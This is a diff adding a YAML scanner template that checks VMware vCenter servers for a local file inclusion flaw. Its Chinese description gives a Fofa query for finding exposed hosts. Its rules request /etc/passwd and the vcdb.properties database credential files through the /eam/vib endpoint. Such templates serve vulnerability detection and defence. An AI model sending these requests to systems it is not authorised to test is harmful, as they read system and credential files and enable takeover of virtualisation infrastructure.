@@ -1,0 +1,40 @@
+id: vmware-vcenter-lfi
+
+info:
+  name: VMware vCenter - Local File Inclusion
+  author: dwisiswant0
+  severity: high
+  verified: true
+  description: |-
+    VMware vCenter 存在任意文件读取漏洞，可读取 vCenter 配置文件获得管理帐号密码进而控制 vCenter 平台及其管理的虚拟机集群。
+    由于 EAM 用户运行该存在漏洞的服务（非域用户），因此不存在 NTLM Relay 等中继攻击风险。
+    Fofa: title="ID_VC_Welcome"
+  reference:
+    - https://kb.vmware.com/s/article/7960893
+    - https://twitter.com/ptswarm/status/1316016337550938122
+    - https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/
+  tags: vmware,lfi,vcenter
+  created: 2024/01/05
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /eam/vib?id=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+    expression: 'response.status == 200 && "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s=".bmatches(response.body)'
+  r2:
+    request:
+      method: GET
+      path: /eam/vib?id=C:\ProgramData\VMware\VMware+VirtualCenter\vcdb.properties
+    expression: 'response.status == 200 && "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s=".bmatches(response.body)'
+  r3:
+    request:
+      method: GET
+      path: /eam/vib?id=C:\Documents+and+Settings\All+Users\Application+Data\VMware\VMware+VirtualCenter\vcdb.properties
+    expression: 'response.status == 200 && "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s=".bmatches(response.body)'
+expression:  r0() || r1() || r2() || r3()
